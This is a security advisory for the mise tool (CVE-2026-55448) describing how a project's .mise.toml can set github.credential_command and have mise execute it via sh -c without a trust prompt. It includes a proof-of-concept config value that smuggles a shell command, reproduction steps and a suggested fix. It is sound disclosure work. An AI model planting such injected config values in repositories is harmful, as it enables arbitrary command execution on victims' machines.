# [M] Mise's local credential_command executes untrusted config

## Summary
Severity: Medium
Advisory: GHSA-29hf-rm4x-xxph
CVE: CVE-2026-55448
CWE: CWE-78
Ecosystem: crates.io
CVSS: CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-06-23
Source: https://github.com/advisories/GHSA-29hf-rm4x-xxph
Type: github-advisory

## Affected
- crates.io: `mise` — affected >=2026.3.15 <2026.6.4

## Details
### Summary

`mise` loads `github.credential_command` from local project config before any trust decision, then executes that value with `sh -c` when resolving a GitHub token. An attacker who can place a `.mise.toml` in a repository can execute arbitrary shell commands when the victim runs a GitHub-related mise command and no higher-priority GitHub token environment variable is set.

The current command-execution path is `github.credential_command`. I confirmed in Docker that the setting is exploitable on `v2026.3.15` and `v2026.3.17`, while `v2026.3.14` rejects it as an unknown field. This report does not depend on the separate trust-bypass issue because the sink is reached directly from `[settings.github]`.

### Details

The vulnerable load order is:

1. [`Settings::try_get()`](https://github.com/jdx/mise/blob/37997e70cd2216d1a86726fba0c8c09c3986ad06/src/config/settings.rs#L254-L283) preloads settings from local config files.
2. [`parse_settings_file()`](https://github.com/jdx/mise/blob/37997e70cd2216d1a86726fba0c8c09c3986ad06/src/config/settings.rs#L505-L510) returns `settings_file.settings` without checking whether the local file is trusted.
3. [`resolve_token()`](https://github.com/jdx/mise/blob/37997e70cd2216d1a86726fba0c8c09c3986ad06/src/github.rs#L344-L390) checks `settings.github.credential_command` after the token env vars and before file-based sources.
4. [`get_credential_command_token()`](https://github.com/jdx/mise/blob/37997e70cd2216d1a86726fba0c8c09c3986ad06/src/github.rs#L558-L599) executes the value with `sh -c`.

The main command-execution path is:

```rust
let result = std::process::Command::new("sh")
    .arg("-c")
    .arg(cmd)
    .arg("mise-credential-helper")
    .arg(host)
    .output()
```

If a local project file sets:

```toml
[settings.github]
credential_command = "echo credential_command_rce > /tmp/mise-proof.txt; echo ghp_fake_token"
```

then `resolve_token()` will reach `get_credential_command_token()` whenever higher-priority GitHub token environment variables are unset. `credential_command` is a documented custom credential source for mise, but it is also accepted from a local project `.mise.toml`, which lets an untrusted repository supply a shell command for mise to execute.

### PoC

Test environment:

- Docker
- `linux-arm64`
- `mise v2026.3.17`

Negative control:

```bash
export GITHUB_TOKEN=env_token
mise github token --unmask
```

Observed:

```text
github.com: env_token (source: GITHUB_TOKEN)
/tmp/mise-proof.txt => missing
```

Primary exploit:

```toml
[settings.github]
credential_command = "echo credential_command_rce > /tmp/mise-proof.txt; echo ghp_fake_token"
```

Run:

```bash
unset GITHUB_TOKEN GITHUB_API_TOKEN MISE_GITHUB_TOKEN MISE_GITHUB_ENTERPRISE_TOKEN
mise github token --unmask
```

Observed:

```text
github.com: ghp_fake_token (source: credential_command)
```

And the side effect file is created:

```text
/tmp/mise-proof.txt => credential_command_rce
```

Related version check:

- `v2026.3.14`: `credential_command` is rejected as an unknown field
- `v2026.3.15`: the same PoC executes and returns `source: credential_command`

### Impact

An attacker who can place a `.mise.toml` in a repository can execute arbitrary shell commands as the victim user when the victim runs a mise command that resolves a GitHub token from local settings.

Demonstrated impact:

- arbitrary command execution as the victim user
- no trust prompt
- no need for `[env]`, `[hooks]`, tasks, or templates

Important limitation:

- if a higher-priority GitHub token environment variable is already set, the `credential_command` path is not reached

### Suggested Fix

Do not honor `github.credential_command` from non-global project config files.

For example, inside `parse_settings_file()`:

```rust
pub fn parse_settings_file(path: &Path) -> Result<SettingsPartial> {
    let raw = file::read_to_string(path)?;
    let settings_file: SettingsFile = toml::from_str(&raw)?;
    let mut settings = settings_file.settings;

    if !config::is_global_config(path) {
        settings.github.credential_command = None;
    }

    Ok(settings)
}
```

## References
- https://github.com/jdx/mise/security/advisories/GHSA-29hf-rm4x-xxph
- https://github.com/jdx/mise
